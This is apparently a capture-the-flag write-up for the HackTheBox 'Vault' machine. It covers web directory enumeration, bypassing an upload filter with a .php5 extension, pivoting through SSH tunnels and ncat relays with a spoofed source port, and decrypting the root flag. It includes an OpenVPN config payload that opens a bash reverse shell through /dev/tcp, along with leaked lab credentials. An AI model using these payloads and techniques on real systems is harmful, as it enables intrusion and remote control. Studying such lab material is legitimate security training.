### Quick Summary 
#### Hey guys today Vault retired and here is my write-up about it. Vault was a fun box and it's absolutely one of my favorites. Starting with an insecure file upload functionality to escaping from a host to another and getting a reverse shell with an `openvpn` config , Every step was very nice. It's rated as medium , it's a linux box and its ip is `10.10.10.109` I added it to `/etc/hosts` as `vault.htb`. Let's jump right in !

### Nmap
#### As always we will start with nmap to scan for open ports and services :
`nmap -sV -sT -sC vault.htb`
![](/images/hackthebox/vault/1.png)
#### Only two ports are open : 80 running http and 22 running ssh. As always we will check http.
<br>
<hr>
### HTTP Initial Enumeration
#### The main page is just displaying this message :
![](/images/hackthebox/vault/2.png)
```
Welcome to the Slowdaddy web interface

We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe.

We are proud to announce our first client: Sparklays (Sparklays.com still under construction)	

```
#### I ran `gobuster` but didn't get anything , so I looked at the message again and noticed this line : `We are proud to announce our first client: Sparklays (Sparklays.com still under construction)`. So I went to `/sparklays` and got a `403` response.
![](/images/hackthebox/vault/3.png)
#### So now we know that this directory exists and we can enumerate the sub directories of it , so I ran gobuster again and got these results :
```

/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/admin.php (Status: 200)
/design (Status: 301)
```
#### `/admin.php` sounds interesting. But in fact it's useless.
`/admin.php` :
![](/images/hackthebox/vault/4.png)
#### It asks for authentication , I tried `test:test` and got nothing. It didn't print anything :
![](/images/hackthebox/vault/5.png)
#### And I also noticed that it's sending the login data through `GET` parameters which is rarely used. Also checked the source of the page and there was nothing important so most likely this is just a rabbit hole and trying to bypass this login is a waste of time. 
`/design` :
![](/images/hackthebox/vault/6.png)
#### Design gave us a `403` response , I ran gobuster one more time and got these results :
```

/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/uploads (Status: 301)
```
#### So I checked `/uploads` : 
![](/images/hackthebox/vault/7.png)
#### And it was also forbidden. But since there is a directory for uploads then there might be a page for uploading files lying around somewhere. I ran gobuster again and added the extensions `php` and `html` and got a new result : `design.html`
`/design.html` :
![](/images/hackthebox/vault/8.png)
#### There's a link titled `Change Logo` which takes us to this upload page :
![](/images/hackthebox/vault/9.png)
<hr>
### Bypassing Restricted File Upload
#### I created a small `php` script to get a reverse shell :
![](/images/hackthebox/vault/10.png)
#### And named it `shell.php`.
#### Tried to upload and as expected , it told us that this file type is not allowed :
![](/images/hackthebox/vault/11.png)
#### We need to know what are the allowed file types , We will use Zap's fuzzer and a [file extenstions wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) I got from seclists.
#### Intercept the request --> right click --> attack --> Fuzzer

<br>
![](/images/hackthebox/vault/13.png)
<br>
<br>
![](/images/hackthebox/vault/14.png)
#### By filtering the response body size we will notice that all the responses are `519` bytes except the response of `.php5` which is `526` bytes. So it allows files with extension `.php5` to be uploaded.
![](/images/hackthebox/vault/15.png)
#### Since the request has already been sent then the php shell is on the server now , Let's excute it :
![](/images/hackthebox/vault/16.png)
<br>
<br>
![](/images/hackthebox/vault/17.png)
#### There are two users on the box `alex` and `dave` , user flag is not on the box. On the desktop of `dave` there is a file called `ssh` which has ssh credentials :
![](/images/hackthebox/vault/18.png)
<br>
<br>
![](/images/hackthebox/vault/19.png)
#### Now we can get an ssh connection as `dave` instead of this reverse shell as `www-data` `dave : Dav3therav3123` :
![](/images/hackthebox/vault/20.png)
<hr>
### Escaping from `ubuntu` to `DNS` , `openvpn` reverse shell , Getting user
#### Let's take a look at the rest of the files on dave's desktop :
![](/images/hackthebox/vault/21.png)
#### No idea what to do with that key `itscominghome` so we will leave it for now. The other file is `Servers` :
![](/images/hackthebox/vault/22.png)
#### We have another ip now : `192.168.122.5` , We need to scan it but unfortunately `nmap` is not on the box :
![](/images/hackthebox/vault/23.png)
#### Alternatively we will use `nc` to scan the first 100 ports like this : `nc -zv 192.168.122.5 1-100`
#### Port 80 is open and running http :
![](/images/hackthebox/vault/24.png)
#### Port 22 is open and running ssh :
![](/images/hackthebox/vault/25.png)
#### We need to take a look at http , but we can't access that host directly , so we will set up an ssh tunnel to redirect port 80 to our local machine :
`ssh -L 1234:192.168.122.4:80 dave@vault.htb`
![](/images/hackthebox/vault/26.png)
#### Now we can go to `http://localhost:1234` and access that http service :
![](/images/hackthebox/vault/27.png)
#### DNS configurator gives us a `404` response :
![](/images/hackthebox/vault/28.png)
#### Vpn configurator allows us to create an `ovpn` file and execute it :
![](/images/hackthebox/vault/29.png)
#### At this point I stopped and searched on that topic , because I didn't know how to get a reverse shell from an `ovpn` file , and [this article](https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da) really helped.
#### We are going to listen on the first host (`ubuntu`) and use the `ovpn` configurator to get a reverse shell on the second host (`DNS`) , We need to know the ip address of `ubuntu` on that subnet , `ifconfig` :
![](/images/hackthebox/vault/30.png)
#### ip : `192.168.122.1`
#### Reverse shell payload : 
```
remote 192.168.122.1
dev tun
nobind
script-security 2 
up "/bin/bash -c 'bash -i >& /dev/tcp/192.168.122.1/9898 0>&1'"
```
![](/images/hackthebox/vault/31.png)
#### I used `nobind` because as you can see there's a note saying that `nobind` must be used. Let's update the file and click on `Test VPN` then check our listener :
![](/images/hackthebox/vault/32.png)
<br>
<br>
![](/images/hackthebox/vault/33.png)
#### And we owned user !
<br>
<hr>
### SSH on DNS
#### In the `/home` directory of `dave` on `DNS` there's a file called `ssh` which has ssh credentials :
![](/images/hackthebox/vault/34.png)
#### So we can close that reverse shell and get an ssh connection on `DNS` as `dave` `dave : dav3gerous567`:
![](/images/hackthebox/vault/35.png)
#### But we had `root` on `DNS` , now we are `dave`. We want to get root again. `sudo -l` tells us that `dave` can use sudo on any command :
![](/images/hackthebox/vault/36.png)
#### So we can easily get `root` again by `sudo su` :
![](/images/hackthebox/vault/37.png)
<hr>
### Auth.log Enumeration
#### By looking at `Servers` file again , which was on `ubuntu`
![](/images/hackthebox/vault/22.png)
#### We notice that there's a host called `The Vault` and its ip is not there , so probably we need to get to that host , but we need its ip first. 
#### After a lot of enumeration I looked into `auth.log` and noticed that on the 2nd of September at `15:10:20` and `15:10:34` these commands were executed :
#### Part of the log :
```
Sep  2 15:08:55 DNS sudo: pam_unix(sudo:session): session closed for user root
Sep  2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session opened for user root by (uid=0)
Sep  2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session closed for user root
Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
Sep  2 15:10:20 DNS sudo: pam_unix(sudo:session): session opened for user root by dave(uid=0)
Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
Sep  2 15:10:34 DNS sudo: pam_unix(sudo:session): session opened for user root by
dave(uid=0)
Sep  2 15:13:43 DNS sudo: pam_unix(sudo:session): session closed for user root
```
![](/images/hackthebox/vault/38.png)
#### Commands :
`/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53`
<br>
<br>
`/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53`
#### We have an ip (`192.168.5.2`) and we suspect that its the one we are looking for. I was using `less` to view the log so I searched for the ip to see if it was mentioned anywhere else `:?192.168.5.2` , And I found it here too :
![](/images/hackthebox/vault/39.png)
#### Command :
`/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444`
#### On the same day at `15:07:51` That ip was scanned with `nmap` , and we notice `--source-port=4444` , what's that ?
<br>
<hr>
### Source Port , Escaping from `DNS` to `vault`
#### Let's take that nmap command and run it again to see the results : 
![](/images/hackthebox/vault/40.png)
#### Port 987 is open and the service is unknown , Let's run nmap one more time as a regular scan :
`nmap -Pn 192.168.5.2`
![](/images/hackthebox/vault/41.png)
#### Port 53 and 4444 , both of them are closed. weird ... where is port 987 ?
#### So what's happening is , port 987 is only open when the source port is 4444. When two hosts communicate with each other through a certain protocol , there's a source port and a destination port , the source port is the port which the request was sent from and this port is randomly generated , the destination port is the port where the request is sent to , and it doesn't change. So for example when communicating through http , the client sends the request from a source port which is random , that request is sent to the destination port which in this case is port 80.
#### To be able to access port 987 we have to make sure that our source port is 4444. To do this we will use `ncat` and make it listen on port 2222 , then the service running on that port will be another `ncat` connection from port 4444 to port 987 on `192.168.5.2` 
`ncat -l 2222 --sh-exec "ncat -p 4444 192.168.5.2 987"`
![](/images/hackthebox/vault/42.png)
#### We will get another ssh connection to `DNS` , then we will connect to port 2222 on localhost , but before connecting we need to know what's the service. Unfortunately `nmap` can't tell us because our connection is not direct.
![](/images/hackthebox/vault/43.png)
#### So I guessed common services and it was `ssh` :
![](/images/hackthebox/vault/44.png)
#### I tried `dave` as the username and `dav3gerous567` as the password (same credentials for `DNS`) and it worked. 
<br>
<hr>
### Decrypting root flag
#### In the `/home` directory of `dave` on `vault` there's a file called `root.txt.gpg` :
![](/images/hackthebox/vault/45.png)
#### Which is the root flag but gpg encrypted :
![](/images/hackthebox/vault/46.png)
#### We need a key to decrypt the flag , remember the key we saw earlier on `ubuntu` ? We will copy the file to `ubuntu` to decrypt it , Easiest way to do it is to `base64` encode it then copy the `base64` data and decode it on `ubuntu`. But `base64` was not installed on `vault` so I used `base32` instead :
![](/images/hackthebox/vault/47.png)
<br>
<br>
![](/images/hackthebox/vault/48.png)
<br>
<br>
![](/images/hackthebox/vault/49.png)
#### Now let's decrypt it with the key : `itscominghome` :
`gpg -d root.txt.gpg`
![](/images/hackthebox/vault/50.png)
#### And we owned root !
<br>
